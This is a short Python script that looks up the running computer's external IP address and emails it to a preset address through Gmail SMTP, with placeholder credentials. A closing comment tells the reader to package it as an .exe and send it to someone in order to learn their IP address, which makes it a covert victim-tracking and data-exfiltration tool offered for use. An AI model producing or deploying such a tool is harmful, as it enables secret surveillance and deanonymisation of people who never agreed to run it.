# Importing the necessary libraries
import urllib.request
import socket
import smtplib


# Checking if computer is connected to the internet
def is_connected():
    try:
        urllib.request.urlopen("https://www.google.com", timeout=1)
        return True
    except:
        pass
    return False


# getting the IP using an external service
external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')

if not is_connected():
    print("Your computer needs to be connected to the internet!")
    input()
    quit()
    exit()
else:
    # Sending the IP via email
    try:
        mail = smtplib.SMTP('smtp.gmail.com',
                            587)  # remove the gmail part and add the extension of your email (ex. smtp.yahoo.com for yahoo emails, smtp.ymail.com for ymail emails)
        mail.ehlo()
        mail.starttls()
        mail.login('email',
                   'password')  # Replace the email with your email that will send the ip address, and the password with the email's password
        mail.sendmail('sender', 'receiver', external_ip)  # The sender should be the same as the email above, and the receiver is the email which the ip address will be sent to
        mail.close()
        print("Ip address sent successfully!")
    except:
        # If any error occurs, then this message will appear
        print("An unknown error has occurred!")
input()

# IMPORTANT

# You can then convert this script into an .exe program by using pyinstaller (Search for it if you dont know how) and then send the program to whoever you want to identify his IP address and it will do the whole job for you
# (Success rate is NOT 100%)
